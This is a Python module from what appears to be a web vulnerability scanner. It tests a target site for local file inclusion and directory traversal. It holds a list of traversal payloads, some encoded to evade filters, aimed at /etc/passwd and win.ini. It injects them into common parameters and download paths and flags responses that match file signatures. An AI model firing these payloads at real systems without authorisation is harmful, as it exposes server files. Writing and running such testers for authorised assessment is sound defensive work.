"""
Local/Remote File Inclusion (LFI/RFI) & Directory Traversal Tester
Hunts for path traversal vulnerabilities that allow reading arbitrary server files.
"""

import concurrent.futures
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, urlunparse
from colorama import Fore, Style

class LFITester:
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url
        self.findings = []
        
        # Common traversal payloads
        self.lfi_payloads = [
            "../../../etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "C:\\Windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
            "file:///etc/passwd"
        ]
        
        # Indicators of successful file reads
        self.success_signatures = [
            "root:x:0:0:",      # /etc/passwd
            "[extensions]",     # win.ini
            "for 16-bit app support" # win.ini
        ]

    def run_all_checks(self):
        """Run LFI and Directory Traversal checks."""
        print(f"{Fore.CYAN}[*] Local File Inclusion & Directory Traversal{Style.RESET_ALL}")
        
        self.test_query_parameters()
        self.test_path_traversal()
        
        return self.findings

    def test_query_parameters(self):
        """Test URL query parameters for LFI (e.g., ?file=, ?page=, ?include=)."""
        print(f"{Fore.YELLOW}[*] Testing common LFI query parameters...{Style.RESET_ALL}")
        
        lfi_params = ['file', 'page', 'doc', 'folder', 'img', 'include', 'template', 'layout', 'path']
        
        def test_param(param):
            url = urljoin(self.base_url, f"/?{param}=test")
            self._inject_payloads(url)

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(test_param, lfi_params)

    def test_path_traversal(self):
        """Test URL paths for direct traversal (e.g., /api/download/../../../etc/passwd)."""
        print(f"{Fore.YELLOW}[*] Testing RESTful path traversal...{Style.RESET_ALL}")
        
        endpoints = ['/api/download/', '/files/', '/images/', '/static/', '/media/']
        
        def test_path(endpoint):
            for payload in self.lfi_payloads:
                url = urljoin(self.base_url, f"{endpoint}{payload}")
                try:
                    resp = self.session.get(url, timeout=3)
                    self._check_response(resp.text, url, payload)
                except Exception:
                    pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(test_path, endpoints)

    def _inject_payloads(self, target_url):
        """Inject LFI payloads into the query string of a target URL."""
        parsed_url = urlparse(target_url)
        params = parse_qsl(parsed_url.query)
        
        if not params:
            return
            
        for payload in self.lfi_payloads:
            mutated_params = []
            for k, v in params:
                mutated_params.append((k, payload))
                
            new_query = urlencode(mutated_params)
            new_url = urlunparse(parsed_url._replace(query=new_query))
            
            try:
                resp = self.session.get(new_url, timeout=3)
                self._check_response(resp.text, new_url, payload)
            except Exception:
                continue

    def _check_response(self, response_text, url, payload):
        """Check if the response contains signatures of sensitive OS files."""
        for sig in self.success_signatures:
            if sig in response_text:
                self.findings.append({
                    'title': 'Local File Inclusion (LFI) / Path Traversal',
                    'description': f'Successfully read local OS file using payload: {payload}',
                    'severity': 'CRITICAL',
                    'owasp': 'A01:2021 / A5:2017',
                    'cwe': 'CWE-22',
                    'remediation': 'Do not pass user-supplied input directly to filesystem APIs. Use indirect object references (e.g., database IDs instead of filenames) or strictly validate against an allowlist.',
                    'evidence': f'URL: {url}\nMatched OS Signature: {sig}',
                    'mitre_attack': 'T1083'
                })
                return True
        return False
